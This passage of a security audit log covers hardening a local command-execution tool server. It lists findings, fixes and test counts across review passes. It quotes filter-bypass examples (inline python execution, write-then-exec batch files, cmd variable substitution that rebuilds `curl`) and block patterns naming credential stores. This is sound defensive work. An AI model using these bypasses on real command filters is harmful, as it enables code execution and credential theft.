**Fix:** Reject caller-supplied `--userconfig=` / `--globalconfig=` args. Force every `npm` invocation to append `--ignore-scripts --userconfig=<nullsink> --globalconfig=<nullsink> --registry=https://registry.npmjs.org/`. Null sink is `NUL` on win32 and `/dev/null` elsewhere.
**Status:** FIXED (v1.7.1)

---

### F-LT-48 — CRITICAL — `python -c` / `python -` / `py -c` unblocked
**Attack vector:** `python -c "import os; os.system('…')"` — plus `py -c`, `python -` (stdin as source), `python -x` (skip first line) — none were caught by BLOCKED_PATTERNS. Only `python -m …` was previously blocked.
**Fix:** Six new patterns covering all inline / stdin / skip-first-line forms for `python`, `python3`, `pythonw`, `python3w`, and `py`.
**Status:** FIXED (v1.7.1)

---

### F-LT-49 — MEDIUM — `realpathSync` ENOENT oracle + raw-path oracle
**Attack vector:** `read_file` on an attacker-guessed path returned distinct error strings for ENOENT vs. pattern-block vs. permission-denied, leaking filesystem structure. Also, `isSensitiveFile` was only applied to the *resolved* realpath, not the raw input — so a non-existent path masquerading as sensitive would fall through.
**Fix:** Added up-front `isSensitiveFile(raw filePath)` check before `realpathSync`. Unified error message for ENOENT / EACCES / EPERM to `"ERROR: File not accessible."` so no path-existence oracle remains.
**Status:** FIXED (v1.7.1)

---

### F-LT-50 — MEDIUM — `git diff`/`git log` pre-flight does not split commit ranges
**Attack vector:** `git diff A..B` and `git log A...B` pass a single argv token containing `..` / `...`. The pre-flight validator treated the whole `A..B` token as one ref and skipped per-ref validation, allowing crafted ref names to bypass individual checks.
**Fix:** Pre-flight now splits on `...` (three dots) first, then `..` (two dots), validating each side independently.
**Status:** FIXED (v1.7.1)

---

### F-LT-51 — MEDIUM — `validateAuth` uses non-constant-time comparison
**Attack vector:** `token === AUTH_TOKEN` short-circuits on first differing byte. Network timing (repeated requests) could leak byte-by-byte content of the server's AUTH_TOKEN.
**Fix:** Rewrote `validateAuth` to length-check then `crypto.timingSafeEqual` on UTF-8 byte buffers.
**Status:** FIXED (v1.7.1)

---

## v1.7.1 Fix Summary

All 16 fifth-pass findings closed in v1.7.1:

| Finding | Severity | Resolution |
|---|---|---|
| F-LT-36 | CRITICAL | Flag-tolerant PowerShell positional scanner |
| F-LT-37 | CRITICAL | `COMSPEC` removed from allowlist; pinned by `buildSafeEnv` |
| F-LT-38 | MEDIUM   | `list_directory` filters sensitive children |
| F-LT-39 | MEDIUM   | `sed -i` rejects targets > 10 MB |
| F-LT-40 | CRITICAL | Broad interpreter+script pattern; node pre-hooks; bun/deno subcommands |
| F-LT-41 | HIGH     | Rename-to-executable extension blocked |
| F-LT-42 | CRITICAL | Flag-tolerant `cmd /c` scanner |
| F-LT-43 | CRITICAL | WSL distro launchers blocked |
| F-LT-44 | CRITICAL | Seven COM/reflection patterns blocked |
| F-LT-45 | HIGH     | `--output-directory` / `--output-indicator-*` in `FORBIDDEN_GIT_FLAGS` |
| F-LT-46 | HIGH     | `NPM_CONFIG_PREFIX` + `NODE_PATH` removed from allowlist |
| F-LT-47 | HIGH     | `.npmrc` cwd override neutralized; caller config flags rejected |
| F-LT-48 | CRITICAL | `python -c` / `-` / `-x` / `py -c` blocked |
| F-LT-49 | MEDIUM   | Up-front sensitive check; unified "not accessible" error |
| F-LT-50 | MEDIUM   | Commit-range split in pre-flight |
| F-LT-51 | MEDIUM   | `crypto.timingSafeEqual` in `validateAuth` |

Test coverage: 81/81 passing (`src/__tests__/security.test.ts`).

---

## Sixth Pass — 2026-04-18 (S54 review → S54 close)

**Reviewer:** Claude Opus 4.7 subagent (deliberately blind brief, files read directly to eliminate prior attachment confusion).
**Verdict:** FAIL. 21 findings. CRITICALs closed in v1.8.0; HIGH/MEDIUM/LOW queued.

Numbering note: F-LT-52 through F-LT-64 are VOID — both earlier sixth-pass attempts against LT mistakenly audited vps-control-mcp code. This pass restarts at F-LT-65 against the actual LT codebase.

### CRITICALs closed in v1.8.0

#### F-LT-65 — `start <binary>` / `call <bat>` / `saps` / direct-path exec not blocked
**Attack:** `start C:\Users\Public\evil.exe` opened arbitrary process via cmd.exe builtin. `call evil.bat` ran batch files. PowerShell `saps` alias for `Start-Process` slipped past the `start-process` literal block. Direct paths like `.\evil.exe` and `C:\path\evil.exe` invoked binaries with no verb gate.
**Fix:** Four BLOCKED_PATTERNS additions: `start(\.exe)?`, `call \S+\.(bat|cmd)`, `\bsaps\b`, plus a separator-required exec/script extension catch-all `[^\s|&;]*[\\\/][^\s\\\/|&;]+\.(exe|com|scr|cpl|msi|bat|cmd|hta|lnk|ps1|psm1|vbs|wsf|jar)`.
**Status:** FIXED (v1.8.0)

#### F-LT-66 — PowerShell write cmdlets to executable extensions not blocked
**Attack:** `Set-Content C:\Temp\evil.bat "calc"` then F-LT-65 `start evil.bat` = write-then-exec RCE. Equally `Out-File`, `Add-Content`, `Tee-Object`, `tee` alias, `copy con` — all wrote arbitrary `.bat`/`.ps1`/`.exe` payloads. The existing `\windows\` directory write guard and the `>` redirect-to-exec rule never covered the cmdlet form.
**Fix:** Three BLOCKED_PATTERNS additions covering Set-Content/Out-File/Add-Content/Tee-Object, the `tee` alias, and `copy con`. All use the same executable-extension list as F-LT-41 rename and L363 redirect rules.
**Status:** FIXED (v1.8.0)

#### F-LT-67 — Sensitive-file regexes were dead code post-normalization (the worst miss)
**Attack:** `isSensitiveFile()` calls `filePath.replace(/\\/g, '/')` BEFORE matching. Patterns written with literal `\\etc\\shadow`, `\\Microsoft\\Credentials`, `\\Microsoft\\Protect`, `\\etc\\gshadow` could never match — every `\` was already gone. `read_file` and `commandContainsSensitivePath` both returned false for the canonical Windows DPAPI credential store path. Empirically: `isSensitiveFile('C:\\...\\Microsoft\\Credentials\\blob')` returned `false`. F-LT-13 (S48) shipped these patterns; six passes never traced one end-to-end.
**Fix:** Rewrote four patterns with cross-separator character class: `[\\\/]etc[\\\/]shadow`, `[\\\/]etc[\\\/]gshadow`, `[\\\/]Microsoft[\\\/]Credentials([\\\/]|$)`, `[\\\/]Microsoft[\\\/]Protect([\\\/]|$)`. Same cross-separator treatment applied to BLOCKED_PATTERNS L260 `\etc\shadow` so the RED-tier check fires on either separator. DPAPI master keys, Credential Manager blobs, and shadow files now genuinely guarded.
**Status:** FIXED (v1.8.0)

#### F-LT-68 — cmd `%VAR:X=Y%` replacement form not blocked
**Attack:** F-LT-25 (S50) commit message claimed `%VAR:X=Y%` (substring replace) was covered, but the actual regex character class was `[~!*]` — only the slice form. `set X=cxxxurl && %X:xxx=%` → `curl` reconstructed from harmless tokens, defeating the `\bcurl\b` block. The inline comment even named the missing case.
**Fix:** Split into two patterns: kept `[~!*]` for slice, added `[^%~!*=]+=[^%]*` for the replacement form. Both now in BLOCKED_PATTERNS.
**Status:** FIXED (v1.8.0)

### v1.8.0 Fix Summary

| Finding | Severity | Resolution |
|---|---|---|
| F-LT-65 | CRITICAL | start / call / saps / direct-path exec now blocked |
| F-LT-66 | CRITICAL | PS write cmdlets to exec extensions blocked |
| F-LT-67 | CRITICAL | sensitive-file patterns rewritten cross-separator; BLOCKED_PATTERNS shadow rule likewise |
| F-LT-68 | CRITICAL | `%VAR:X=Y%` replacement form added alongside slice form |

Test coverage: 113/113 passing (was 81; four new describe blocks for the sixth-pass CRITICALs).

### Pending (queued for S55)

- HIGH cluster (11): F-LT-69 (Add-Type), F-LT-70 (Import-Module/ipmo/using module), F-LT-71 (PSRemoting), F-LT-72 (Invoke-Item/Start-Job), F-LT-73 (ftype/assoc), F-LT-74 (.NET compilers csc/vbc/jsc/ilasm/aspnet_compiler), F-LT-75 (LOLBAS expansion: psexec/winrs/scriptrunner/cdb/control/tttracer/dnscmd/etc.), F-LT-76 (git `=value` glued flag bypass), F-LT-77 (PS dot-source), F-LT-78 (alternate shells `bash -c` without .exe), F-LT-79 (sensitive-file gaps: Edge, Brave, Chrome Network/Cookies, DPAPI Crypto Keys, FileZilla, GitCredentialManager, .vscode/settings.json).
- MEDIUM cluster (4): F-LT-80 (powershell - stdin), F-LT-81 (Register-ScheduledTask), F-LT-82 (python combined-flag -ic/-Bc/-uc), F-LT-83 (mklink junctions/hardlinks).
- LOW cluster (2): F-LT-84 (setup.ps1 .env ACL), F-LT-85 (audit.log integrity / sanitizeArgs gaps).

Full findings report: `SIXTH_PASS_LT_FINDINGS.md` (repo root of the cowork workspace).

